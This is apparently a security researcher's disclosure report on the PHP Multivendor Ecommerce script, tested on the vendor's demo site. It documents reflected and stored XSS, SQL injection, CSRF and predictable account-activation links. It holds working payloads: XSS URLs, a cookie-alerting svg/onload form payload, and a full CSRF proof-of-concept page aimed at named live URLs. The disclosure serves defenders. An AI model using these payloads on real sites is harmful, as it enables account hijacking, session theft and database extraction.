### PHP Multivendor Ecommerce- the lastest version - SQL Injection/Reflect-XSS/Stored-XSS/CSRF/Arbitrary-Binding

Well,  when I pentest the official demo site of PHP Multivendor Ecommerce, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

###### XSS1

```
http://www.fxwebsolution.com/demo/arthi/multivendor/category.php?chid1=40%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/xss/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss1.png)

###### XSS2

```
http://www.fxwebsolution.com/demo/arthi/multivendor/seller-view.php?usid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss2/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss2.png)

###### XSS3

```
http://www.fxwebsolution.com/demo/arthi/multivendor/shopping-cart.php?cusid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss3/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss3.png)


###### XSS4

````
http://www.fxwebsolution.com/demo/arthi/multivendor/my_wishlist.php?fid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss4/)%3E123%3C%27%22
````

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss4.png)


##### Stored-XSS 


```
http://www.fxwebsolution.com/demo/arthi/multivendor/admin/sellerupd.php?upd=2&uid=36&id=61
```

POST parameters:

```
------WebKitFormBoundary2wspk6wZ1zP1BEHR
Content-Disposition: form-data; name="companyname"

abc pvt ltd'"><svg/onload=alert(document.cookie)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sxss.png)



#### SQL Injection:

##### sqli1
```
http://www.fxwebsolution.com//demo/arthi/multivendor/seller-view.php?usid=60
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli1.png)

##### sqli2

```
http://www.fxwebsolution.com/demo/arthi/multivendor/shopping-cart.php?cusid=60
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli2.png)


##### sqli3

```
http://www.fxwebsolution.com/demo/arthi/multivendor/my_wishlist.php?fid=60
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli3.png)


You can see,  we can obtain the current data user or more sensitive data now!


#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/www.fxwebsolution.com\/demo\/arthi\/multivendor\/admin\/sellerupd.php?upd=2&uid=36&id=61", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary2wspk6wZ1zP1BEHR");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"idvalue\"\r\n" + 
          "\r\n" + 
          "61\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"upd\"\r\n" + 
          "\r\n" + 
          "2\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"user_mail\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"companyname\"\r\n" + 
          "\r\n" + 
          "abc pvt ltd\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"companyname\"\r\n" + 
          "\r\n" + 
          "abc pvt ltd\'\"\x3e\x3csvg/onload=alert(document.cookie)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"about\"\r\n" + 
          "\r\n" + 
          "ihguifhugjhufdhgjhd\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"store\"\r\n" + 
          "\r\n" + 
          "avc\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"cphone\"\r\n" + 
          "\r\n" + 
          "2147483647\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"policy\"\r\n" + 
          "\r\n" + 
          "gfgfvhhjj\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"address1\"\r\n" + 
          "\r\n" + 
          "chennai\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"address2\"\r\n" + 
          "\r\n" + 
          "chennai\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"proof\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR\r\n" + 
          "Content-Disposition: form-data; name=\"_submit\"\r\n" + 
          "\r\n" + 
          "Save\r\n" + 
          "------WebKitFormBoundary2wspk6wZ1zP1BEHR--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

This vulnerability does not need evil attacker to login into the user panel.

#### Arbitrary-Binding

I found when we're register the account, we should verify the email to activate the account.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/arbitrary-binding1.png)

But the url which send to the email is predictable. For example, the url the system send to my email is:
```
http://www.fxwebsolution.com/demo/arthi/multivendor/sign-in.php?eqid=NTA=
```
After Base64 decode:
```
http://www.fxwebsolution.com/demo/arthi/multivendor/sign-in.php?eqid=50
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/arbitrary-binding2.png)

So it's easy to predict or enum the eid to activate our account, then we can bind the account to any email-account, even if it's not exist.

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/arbitrary-binding3.png)

In a word, it's a arbitrary-Binding bug here.